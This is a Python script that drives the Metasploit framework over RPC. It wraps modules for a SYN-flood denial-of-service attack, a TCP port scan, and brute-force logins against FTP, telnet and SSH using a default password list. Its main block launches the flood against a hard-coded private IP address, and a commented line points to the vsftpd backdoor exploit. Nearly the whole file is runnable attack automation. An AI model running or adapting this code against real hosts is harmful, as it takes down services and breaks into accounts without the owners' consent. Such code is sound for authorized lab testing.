from pymetasploit3.msfrpc import MsfRpcClient
class Metasploit:
    def __init__(self):
        # The MsfRpcClient class provides the core functionality to navigate through the Metasploit framework.
        self.client = MsfRpcClient('kali', ssl=True)

    # Start a denial-of-service (dos) attack
    # It sends a bunch of tcp handshakes to the target
    def dos_attack(self, ip: str):
        exploit = self.client.modules.use('auxiliary', 'dos/tcp/synflood')
        exploit['RHOSTS'] = ip
        print(exploit.description)
        exploit.execute()
        print(self.client.sessions.list)

    def tcp_portscan_attack(self, ip: str):
        exploit = self.client.modules.use('auxiliary', 'auxiliary/scanner/portscan/tcp')
        exploit['RHOSTS'] = ip
        print(exploit.description)
        exploit.execute()

    # Brute-force login attack on ftp, telnet and ssh
    def brute_force_login(self, ip: str, port: str):
        if(port == 'ftp'):
            exploit = self.client.modules.use('auxiliary', 'scanner/ftp/ftp_login')
        elif(port == 'telnet'):
            exploit = self.client.modules.use('auxiliary', 'scanner/telnet/telnet_login')
        elif(port == 'ssh'):
            exploit = self.client.modules.use('auxiliary', 'scanner/ssh/ssh_login')
        exploit['RHOSTS'] = ip
        exploit['PASS_FILE'] = './telnet_default_pass.txt'
        print(exploit.description)
        exploit.execute()


    # Use dir(client) to see the callable methods.
    #print(dir(self.client))

    # Explore exploit modules
    #for i in client.modules.exploits:
    #    print(i)

    # Create an exploit module object
    # exploit = client.modules.use('exploit', 'unix/ftp/vsftpd_234_backdoor')
    #exploit = client.modules.use('auxiliary', 'auxiliary/scanner/portscan/tcp')

    # Explore exploit information:
    #print(exploit.description)

if __name__ == "__main__":
    metaspl = Metasploit()
    metaspl.dos_attack('10.47.1.62')
    #metaspl.brute_force_login('127.0.0.1', 'ssh')
